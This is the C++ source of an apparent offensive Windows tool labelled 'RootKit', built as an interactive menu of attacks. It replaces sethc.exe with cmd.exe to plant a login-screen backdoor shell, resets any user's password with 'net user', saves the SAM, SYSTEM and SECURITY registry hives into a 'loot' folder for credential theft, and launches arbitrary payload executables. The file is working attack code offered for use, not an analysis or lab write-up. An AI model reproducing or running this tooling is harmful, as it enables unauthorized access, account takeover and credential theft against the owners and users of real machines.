// Import library/module
#include <cstdlib>
#include <iostream>
#include "module/termcolor.hpp"
// Set namespaces
using namespace std;
using namespace termcolor;


// Set variable 
string banner = "--------------------------------------\n\n  ____             _   _  ___ _   \n |  _ \\ ___   ___ | |_| |/ (_) |_ \n | |_) / _ \\ / _ \\| __| ' /| | __|\n |  _ < (_) | (_) | |_| . \\| | |_ \n |_| \\_\\___/ \\___/ \\__|_|\\_\\_|\\__|\n                                  \nBy Perrtatter\nhttps://github.com/Perrtatter/Windows-RootKit\n--------------------------------------";
string bin_path = "C:\\Windows\\System32";
string choice;
bool running = true;

// Clear screen fonction
int clear_screen(){
    // Run command
    system("cls");

    // Return 0 , cause is a int loop
    return 0;
};

// Show banner fonction
int show_banner(){
    // Print banner
    cout << red << banner << reset << endl;

    // Return 0 , cause is a int loop
    return 0;
};

int show_help_menu(){
    // Print help menu
    cout << "[" << red << "1" << reset << "] Replace sethc.exe to cmd.exe ( " << red << "setup only" << reset << " )" << endl;
    cout << "[" << red << "2" << reset << "] List user ( " << red << "machine only" << reset << " )" << endl;
    cout << "[" << red << "3" << reset << "] Change password ( " << red << "machine only" << reset << " )" << endl;
    cout << "[" << red << "4" << reset << "] Dump SAM base ( " << red << "machine only" << reset << " )" << endl;
    cout << "[" << red << "5" << reset << "] Run payload (payload/[payload-name].exe)  ( " << red << "machine only" << reset << " )" << endl; 
    cout << "--------------------------------------" << endl;
    cout << "[" << red << "0" << reset << "] Save change ( exit with 'shutdown -h' )" << endl;
    cout << "[" << red << "99" << reset << "] Clear Screen" << endl;

    cout << endl;

    // Return 0 , cause is a int loop
    return 0;
};

// Main loop
int main(){

    // Print banner
	show_banner();

    // Ask for change binary path
    cout << "[" << yellow << "!" << reset << "] Bin path is : " << yellow << bin_path << reset << ", would you change it (y/n) > ";
    cin >> choice ;


    if (choice == "y"){
        // Ask for change binary path
        cout << "[" << magenta << "+" << reset << "] Enter your new binary path (" << magenta << "X:\\xxxxx\\xxxxxx" << reset << " ) > " ;
        cin >> bin_path ;
    }

    else{
        // Pass
        ;
    }
    
    // Clear terminal and reprint banner + help menu
    clear_screen();
    show_banner();
    show_help_menu();

    while (running){
        // Choice option
        cout << "[" << magenta << "+" << reset << "] Enter your option > ";
        cin >> choice;

        if (choice == "1"){
            // Replace sethc.exe to cmd.exe
            string payload = "move " + bin_path + "\\sethc.exe " + bin_path + "\\sethc.exe.bak && copy " + bin_path + "\\cmd.exe " + bin_path + "\\sethc.exe";
            system(payload.c_str());

            // Show success message 
            cout << "[" << green << "*" << reset << "] Payload runned successfully" << endl;
        }

        else if (choice == "2"){
            // List user
            string payload = bin_path + "\\net user";
            system(payload.c_str());
            cout << "[" << green << "*" << reset << "] Payload runned successfully" << endl;
        }

        else if (choice == "3"){
            // Ask for username
            string username;
            cout << "[" << magenta << "+" << reset << "] Enter your target user ( use option 2 for list user ) > ";
            cin >> username;

            // Ask for password
            string password;
            cout << "[" << magenta << "+" << reset << "] Enter your new password > ";
            cin >> password;

            // Change password
            string payload = bin_path + "\\net user " + username + " " + password;
            system(payload.c_str());
            
            // Show success message 
            cout << "[" << green << "*" << reset << "] Payload runned successfully" << endl;
        }

        else if (choice == "4"){
            // Dump SAM base
            string payload = "@echo off && cd loot && mkdir %USERNAME%_base_sam && cd %USERNAME%_base_sam >NUL 2>&1 && reg save hklm\\sam ./sam.save && reg save hklm\\system ./system.save && reg save hklm\\security ./security.save ";
            system(payload.c_str());

            // Show loot export success message 
            cout << "[" << blue << "*" << reset << "] Loot exfiltrate as : " << blue << "'/loot/[PC-USERNAME]'" << reset << endl;

            // Show success message 
            cout << "[" << green << "*" << reset << "] Payload runned successfully" << endl;
        }

        else if (choice == "5"){
            // List payload
            cout << "--------------------------------------" << endl;
            system("dir payload");
            cout << "--------------------------------------" << endl;

            // Ask for payload
            string payload_arguments;
            cout << "[" << magenta << "+" << reset << "] Enter your payload arguments ( [payload-name].exe [arguments] ) > ";
            cin >> payload_arguments;

            // Run payload
            string payload = "start /b " + payload_arguments;
            system(payload.c_str());

            // Show success message 
            cout << "[" << green << "*" << reset << "] Payload runned successfully" << endl;
        }

        else if (choice == "0"){
            // Stop running
            running = false;
        }

        else if (choice == "99") {
            // Clear terminal and reprint banner + help menu
            clear_screen();
            show_banner();
            show_help_menu();
        
        }

        else {
            // Print error
            cout << "[" << red << "!" << reset << "] Invalide option" << endl;
        }

        // Jump line 
        cout << endl;

    }


    // Shutdwon PC
    string payload = bin_path + "\\shutdown -h";
    system(payload.c_str());

    // Return 0 , cause is a int loop
	return 0;

}